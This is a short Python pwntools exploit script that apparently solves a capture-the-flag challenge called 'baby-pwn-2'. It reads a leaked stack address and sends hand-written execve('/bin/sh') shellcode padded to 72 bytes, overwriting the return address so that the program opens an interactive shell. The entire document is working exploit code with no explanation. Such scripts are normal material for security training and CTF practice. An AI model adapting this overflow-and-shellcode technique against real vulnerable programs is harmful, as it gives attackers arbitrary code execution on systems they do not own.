from pwn import *

context.binary = binary = ELF('./baby-pwn-2', checksec=False)

p = process()

p.recvuntil(b'Stack address leak: ')

shellcode_addr = p64(int(p.recvline()[:-1].decode(), 16))
shellcode = asm('''
		lea rdi, [rip+bin_sh]
		xor rsi, rsi
		xor rdx, rdx
		mov rax, 59
		syscall

		bin_sh:
			.string "/bin/sh"
			''')

payload = shellcode
payload += b'A' * (72 - len(shellcode))
payload += shellcode_addr

p.sendline(payload)
p.recvrepeat(1)

p.interactive()
